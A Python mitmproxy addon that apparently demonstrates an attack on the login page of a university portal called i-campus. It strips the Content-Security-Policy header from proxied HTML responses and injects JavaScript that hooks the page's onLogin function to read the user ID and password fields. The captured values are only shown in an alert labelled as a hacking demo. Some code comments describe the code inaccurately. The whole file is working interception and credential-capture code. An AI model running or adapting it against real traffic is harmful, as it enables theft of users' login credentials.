from mitmproxy import ctx
from bs4 import BeautifulSoup
# from libmproxy.protocol.http import decoded

# On start of proxy server ask for src as an argument


# def start(context, argv):
#     context.src_url = 'http://127.0.0.1:1234/script.js'


# def response(context, flow):
#     print('FOO')
#     if flow.request.host in context.script:
#         return  # Make sure JS isn't injected to itself
#     # with decoded(flow.response):


# def read_file(filename):
#     with open(filename) as f:
#         return f.read()


class Counter:
    def __init__(self):
        self.num = 0

    def request(self, flow):
        self.num = self.num + 1
        ctx.log.info("We've seen %d flows" % self.num)

    def response(self, flow):
        html = BeautifulSoup(flow.response.content)
        # inject only for HTML resources
        if html.body and ("text/html" in flow.response.headers["content-type"]):
            # delete CORS header if present
            if "Content-Security-Policy" in flow.response.headers:
                del flow.response.headers["Content-Security-Policy"]
            # inject SocketIO library from CDN
            script = html.new_tag("script", type="application/javascript")
            script.insert(0, '''
(function() {
  "use strict";

  var orig = window.onLogin;
  console.log(orig);
  window.onLogin = function() {
    var id = document.form1.uid.value;
    var pw = document.form1.pwd.value;
    alert(
      "아이캠퍼스 해킹 시연입니다\\n실제로 유출되진 않으니 안심하세요\\nid: " +
        id +
        ", password: " +
        pw
    );
    return orig();
  };
  // Your code here...
})();
            ''')
            html.body.append(script)
            flow.response.text = str(html)
            ctx.log.info("script injected")


addons = [
    Counter()


]
